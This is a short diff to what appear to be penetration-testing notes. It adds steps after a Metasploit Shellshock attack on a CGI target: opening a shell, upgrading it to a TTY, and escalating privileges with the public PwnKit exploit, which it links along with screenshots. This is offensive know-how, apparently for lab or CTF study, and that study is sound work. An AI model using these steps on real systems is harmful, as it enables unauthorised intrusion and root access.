@@ -142,6 +142,12 @@ SHELLSHOCK
     set RHOSTS 192.168.0.24
     set RPORT 80
     set TARGETURI /cgi-bin/keygen
+    shell
+    script /dev/null -qc /bin/bash
+    利用PwnKit提權
+[PwnKit](https://github.com/ly4k/PwnKit)
+![image](https://github.com/user-attachments/assets/9242b59d-f2a8-4ee5-95d7-43a14b314eaf)
+![image](https://github.com/user-attachments/assets/f5aadc76-536d-4003-b29f-13dc4ea1b0a9)
 
 
 LFI to RCE
